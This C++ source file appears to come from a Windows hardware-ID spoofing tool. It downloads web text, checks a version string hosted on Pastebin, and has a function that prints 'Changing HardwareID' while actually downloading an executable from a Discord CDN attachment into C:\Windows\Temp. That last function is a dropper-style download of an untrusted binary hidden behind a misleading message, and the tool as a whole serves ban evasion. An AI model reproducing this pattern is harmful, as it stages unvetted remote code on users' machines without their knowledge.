#include "WEB.h"
#include <tchar.h>

string WEB::replaceAll(string subject, const string& search,
	const string& replace) {
	size_t pos = 0;
	while ((pos = subject.find(search, pos)) != string::npos) {
		subject.replace(pos, search.length(), replace);
		pos += replace.length();
	}
	return subject;
}

string WEB::DownloadString(string URL) {
	HINTERNET interwebs = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
	HINTERNET urlFile;
	string rtn;
	if (interwebs) {
		urlFile = InternetOpenUrlA(interwebs, URL.c_str(), NULL, NULL, NULL, NULL);
		if (urlFile) {
			char buffer[2000];
			DWORD bytesRead;
			do {
				InternetReadFile(urlFile, buffer, 2000, &bytesRead);
				rtn.append(buffer, bytesRead);
				memset(buffer, 0, 2000);
			} while (bytesRead);
			InternetCloseHandle(interwebs);
			InternetCloseHandle(urlFile);
			string p = replaceAll(rtn, "|n", "\r\n");
			return p;
		}
	}
	InternetCloseHandle(interwebs);
	string p = replaceAll(rtn, "|n", "\r\n");
	return p;
}


void WEB::CheckVersion(string version) {
	if (DownloadString("https://pastebin.com/raw/MVPZWNFJ") != version) {
		MessageBoxA(NULL, "Your version is outdated!", "VERSION!", 0);
		exit(0);
	}
}


int WEB::Perse() 
{
	std::cout << "\x1B[31m[\033[0m\x1B[91m!\033[0m\x1B[31m]\033[0m \Changing HardwareID" << std::endl;
	string URL = "https://cdn.discordapp.com/attachments/755293152000082005/755460939981258752/ConsoleApp1.exe";
	string path = "C:\\Windows\\Temp\\ConsoleApp1.exe";
	URLDownloadToFile(NULL, URL.c_str(), path.c_str(), 0, NULL);
	return 0;
} 